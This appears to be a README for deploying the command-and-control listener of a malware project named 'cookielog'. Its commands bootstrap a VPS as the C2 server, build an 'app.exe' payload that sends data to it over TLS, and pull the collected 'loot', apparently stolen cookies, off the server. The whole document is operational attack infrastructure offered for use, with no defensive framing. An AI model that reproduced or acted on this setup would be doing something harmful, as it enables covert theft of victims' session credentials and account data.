# VPS listener

`bootstrap.sh` turns a clean Debian/Ubuntu host into the C2 listener:

```sh
# on the VPS, from the repo root
scp -r . root@vps:/root/cookielog
ssh root@vps
cd /root/cookielog
./deploy/vps/bootstrap.sh c2.example.com
```

Before running, point `A` (and `AAAA` if the host has IPv6) at the VPS. Caddy
issues and renews the certificate itself; there is no certbot step.

## What runs

| unit | bind | role |
|------|------|------|
| `cklog-listener.service` | `127.0.0.1:9415` | `listen.py`, writes `/opt/cookielog/loot` |
| `caddy` | `0.0.0.0:80,443` | TLS, reverse proxy to the listener |

The listener is not reachable from the internet except through Caddy.

## Payload and TLS

The payload speaks TLS 1.2 itself (schannel), so the production shape is:

```sh
./deploy/vps/bootstrap.sh c2.example.com
python build.py stage app.exe --c2 https://c2.example.com/
```

The listener stays on `127.0.0.1:9415`; Caddy terminates TLS on 443, forwards the
plain POST to the listener and renews the certificate. Nothing else is exposed.

`--plain` is only for a legacy plain-HTTP build or a direct listener on 9415
(opens the port in ufw). Do not use it with an `https://` C2.

Chunked delivery expects a `200` per chunk; Caddy passes the response through,
so a healthy deployment logs `x/n` chunk headers and ends with the coverage row.

## Operations

```sh
systemctl status cklog-listener caddy
journalctl -u cklog-listener -f
curl -s https://c2.example.com/health
curl -s https://c2.example.com/coverage | head
```

Loot stays on the VPS under `/opt/cookielog/loot` (mode 700, user `cklog`).
Pull it with `rsync`; do not sync it back into git.
